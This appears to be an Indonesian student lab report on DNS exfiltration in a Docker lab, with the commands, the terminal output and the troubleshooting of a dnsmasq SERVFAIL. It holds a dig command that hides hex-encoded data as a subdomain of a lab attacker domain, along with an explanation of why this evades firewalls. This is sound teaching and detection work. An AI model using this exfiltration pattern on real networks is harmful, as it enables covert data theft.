# Tugas 7 (Pertemuan 7): DNS Exfiltration — Kasus 6

> **Status: sebagian berhasil, sebagian masih dalam troubleshooting.** Laporan ini mendokumentasikan progres apa adanya, termasuk kendala teknis yang ditemukan dan analisis root cause-nya, sesuai hasil eksekusi nyata.

## Perintah yang dijalankan

```powershell
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml up -d

# Encode NIM ke hex (dijalankan di dalam container attacker, bukan di PowerShell host)
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo -n 24552011060 | xxd -p"

# Kirim query DNS exfiltration (hex hasil encode sebagai subdomain)
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131303630.k6.exfil.lab @dns

# Diagnostik: dig lengkap (bukan +short) untuk melihat status response
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig 3234353532303131303630.k6.exfil.lab @dns

# Cek statistik dnsmasq
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec dns kill -USR1 1
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k6.log

# Decode kembali hex ke NIM asli (verifikasi integritas data)
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo 3234353532303131303630 | xxd -r -p"
```

> Catatan teknis PowerShell: `echo -n` dan `xxd` tidak tersedia native di Windows, sehingga dijalankan di dalam container Linux (`attacker`) via `docker compose exec ... sh -c "..."`, bukan langsung di shell host.

## Output terminal

**Encode NIM ke hex:**
```
3234353532303131303630
```

**Query `dig +short` (hasil kosong):**
```
(tidak ada output)
```

**Query `dig` lengkap (menunjukkan status error):**
```
; <<>> DiG 9.20.30-1-Debian <<>> 3234353532303131303630.k6.exfil.lab
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 24403
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;3234353532303131303630.k6.exfil.lab. IN        A

;; Query time: 4 msec
;; SERVER: 127.0.0.11#53(127.0.0.11) (UDP)
;; WHEN: Tue Nov 24 13:51:33 UTC 2026
;; MSG SIZE  rcvd: 53
```

**Statistik dnsmasq (`kill -USR1 1` → `docker compose logs dns`):**
```
dns-1  | dnsmasq[1]: started, version 2.90 cachesize 150
dns-1  | dnsmasq[1]: DNS service limited to local subnets
dns-1  | dnsmasq[1]: warning: no upstream servers configured
dns-1  | dnsmasq[1]: read /etc/hosts - 9 names
dns-1  | dnsmasq[1]: time 1795528080
dns-1  | dnsmasq[1]: cache size 150, 0/0 cache insertions re-used unexpired cache entries.
dns-1  | dnsmasq[1]: queries forwarded 0, queries answered locally 0
dns-1  | dnsmasq[1]: queries for authoritative zones 0
```

**Decode hex kembali ke NIM asli:**
```
24552011060
```

## Analisis / Penjelasan

### Bagian yang berhasil: mekanisme encoding DNS exfiltration

Proses encode-decode NIM melalui hex berhasil sempurna dan membuktikan prinsip dasar DNS exfiltration:

1. NIM asli `24552011060` di-encode menjadi hex `3234353532303131303630`.
2. Hex tersebut disisipkan sebagai *subdomain* dari domain yang dikontrol penyerang (`k6.exfil.lab`), menghasilkan query `3234353532303131303630.k6.exfil.lab`.
3. Hex yang sama berhasil di-decode kembali menjadi `24552011060` — identik dengan NIM asli.

Ini menunjukkan prinsip inti DNS exfiltration: **data yang ingin dicuri (NIM) disamarkan sebagai bagian dari nama domain** dalam sebuah query DNS yang terlihat sah secara sintaks, lalu pihak yang mengontrol *authoritative DNS server* dari domain tersebut dapat merekonstruksi data asli hanya dengan membaca log query yang masuk — tanpa memerlukan koneksi langsung (TCP/HTTP) antara korban dan penyerang, menjadikannya teknik yang sering lolos dari firewall berbasis port/protokol biasa.

### Kendala: respons `SERVFAIL` dari dnsmasq

Query DNS yang dikirim ke server `dns` (dnsmasq) tidak dijawab dengan benar — mengembalikan status `SERVFAIL` alih-alih jawaban (atau bahkan `NXDOMAIN` jika domain memang tidak terdaftar). Analisis dari log startup dnsmasq dan statistik `kill -USR1 1` menunjukkan akar masalahnya:

- Log startup mencatat **`warning: no upstream servers configured`**.
- Statistik menunjukkan **`queries forwarded 0, queries answered locally 0, queries for authoritative zones 0`** — bahkan setelah query dikirim, dnsmasq mencatat nol *authoritative zone* yang cocok.

Kesimpulan sementara: dnsmasq pada container `dns` kemungkinan **belum dikonfigurasi untuk menjadi authoritative untuk zone `k6.exfil.lab`** (biasanya lewat directive seperti `address=/k6.exfil.lab/...` atau `local=/k6.exfil.lab/` di `/etc/dnsmasq.conf` atau file di `/etc/dnsmasq.d/`). Karena domain tersebut dianggap "bukan miliknya", dnsmasq mencoba forward query ke upstream DNS — namun karena tidak ada upstream yang dikonfigurasi, forward tersebut gagal dan menghasilkan `SERVFAIL`.

Diagnosis lanjutan (pengecekan isi `/etc/dnsmasq.conf` dan `/etc/dnsmasq.d/`, serta pengujian query langsung ke IP container `dns`) sedang berjalan untuk memastikan root cause ini dan menemukan perbaikan konfigurasi yang tepat.

### Implikasi terhadap deteksi (`analisis_dns.py`)

Karena dnsmasq belum logging/menjawab query secara authoritative, isi `dns-k6.log` belum memuat baris query nyata (`3234...k6.exfil.lab`) yang bisa dianalisis oleh script deteksi anomali — hanya memuat pesan startup dan statistik. Dengan demikian, eksekusi `analisis_dns.py` terhadap log ini belum dapat dijalankan secara bermakna sampai isu konfigurasi dnsmasq ini diperbaiki.

## Langkah Selanjutnya (belum selesai)

1. Memeriksa isi `/etc/dnsmasq.conf` dan `/etc/dnsmasq.d/` pada container `dns` untuk konfirmasi apakah zone `k6.exfil.lab` sudah/belum terdaftar sebagai authoritative.
2. Jika belum, menambahkan directive yang sesuai (mis. `address=/k6.exfil.lab/0.0.0.0`) dan me-restart service, lalu mengulangi query.
3. Mengaktifkan/memverifikasi `--log-queries` pada dnsmasq agar query exfiltration benar-benar tercatat di log.
4. Menjalankan ulang `python kasus/k9-dns-detect/analisis_dns.py dns-k6.log` (dengan `python`, bukan `python3`, karena `python3` tidak terdaftar sebagai alias di sistem) setelah log berisi data query yang valid.

## Screenshot
Lihat folder `screenshot/` untuk bukti visual.